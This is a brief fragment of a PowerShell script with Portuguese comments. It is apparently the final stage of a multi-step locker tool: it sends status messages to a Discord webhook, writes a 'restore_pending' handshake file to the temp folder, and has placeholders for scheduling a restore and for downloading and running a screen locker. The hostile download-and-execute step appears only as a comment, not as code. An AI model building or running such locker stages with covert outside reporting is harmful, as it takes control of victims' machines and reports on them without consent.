...
# ---------- Etapa 7/7: Handshake + Agendamento + Screen Locker ----------
Send-DiscordWebhook "📅 Criando handshake, agendando restauração e iniciando bloqueio de tela (7/7)"

# Handshake
$handshakeFile = "$env:TEMP\handshake_restore.txt"
"restore_pending" | Out-File -FilePath $handshakeFile -Force

# Agendamento da restauração (daqui a 30 segundos)
...
# Baixar e executar screen locker
